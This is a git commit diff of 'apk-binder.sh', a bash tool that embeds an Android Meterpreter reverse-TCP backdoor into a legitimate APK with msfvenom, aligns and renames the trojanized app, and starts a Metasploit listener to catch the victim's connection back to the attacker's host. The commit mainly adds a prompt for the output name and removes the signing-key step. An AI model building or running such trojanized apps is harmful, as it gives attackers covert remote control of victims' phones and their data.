13e92972b347d66836cac7386226c1a0ce50c8ae
Mohit Saran <48322980+kinghacker0@users.noreply.github.com>
2020-02-10 12:59:53 +0530

    Update apk-binder.sh

--- apk-binder.sh
+++ apk-binder.sh
@@ -2,7 +2,6 @@
 #Credit - Give me credit if you use any part of script
 
 #Banner Start
-echo -e "\e[31m                                      \e[1m"
 echo -e "    ___        __       ___  _         __    "
 echo -e "   / _ | ___  / /______/ _ )(_)__  ___/ /__ ____ "
 echo -e "  / __ |/ _ \/  '_/___/ _  / / _ \/ _  / -_) __/  "
@@ -14,18 +13,20 @@ echo -e "\e[49m                                 \e[2m"
 
 #Bind Backdoor
 read -p "[*]Enter filepath of apk#~: " path
+read -p "[*]Enter output payload name#~: " payload
 read -p "[*]Enter lhost#~: " lhost
 read -p "[*]Enter lport#~: " lport
 echo -e "\e[31m[*]Reverse Engineering Started..;p\e[0m"
 msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> binded.apk
 
 #Signing the apk
-echo -e "\e[49m[*]signing the apk                              \e[2m"
-keytool -genkey -v -keystore key.jsk -keyalg RSA -keysize 2048
+echo "\e[31m                                                   \e[2m"
+echo -e " [-]signing the apk                             "
 zipalign -v 4 binded.apk binded-signed.apk
 
 #listner start
-rm binded.apk && rm key.jsk
-read -p "[*]Start listner(Enter) or Close (Ctrl+c) :" listner
+rm binded.apk && mv binded-signed.apk $payload.apk
+echo "                                                "
+read -p "\e[34m[-]Start listner(Enter) or Close (Ctrl+c) : \e[2m" listner
 msfconsole
 #Changing this banner doesn't make you programmer..!"
